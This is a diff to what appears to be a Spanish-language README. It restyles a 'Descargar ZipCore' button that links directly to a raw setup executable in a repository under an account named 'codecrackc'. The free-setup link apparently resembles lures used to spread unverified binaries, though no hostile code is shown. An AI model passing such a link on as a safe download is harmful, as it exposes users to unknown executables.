@@ -29,9 +29,15 @@ const yo = {
 };
 
 ```
-<p align="">
+<p align="center">
   <a href="https://github.com/codecrackc/ZIPCORE/raw/main/ZipCore_Gratis_Setup_v1.0.0.exe" target="_blank">
-    <img src="https://img.shields.io/badge/⬇️_Descargar_ZipCore-00F2FE?style=for-the-badge&logo=windows&logoColor=white" />
+    <img src="https://raw.githubusercontent.com/simple-icons/simple-icons/develop/icons/windows11.svg" width="18"/>
+    <svg width="220" height="50" viewBox="0 0 220 50" xmlns="http://www.w3.org/2000/svg">
+      <rect width="220" height="50" rx="12" fill="#00F2FE"/>
+      <text x="110" y="32" font-size="16" text-anchor="middle" fill="black" font-family="Arial">
+        ⬇ Descargar ZipCore
+      </text>
+    </svg>
   </a>
 </p>
 
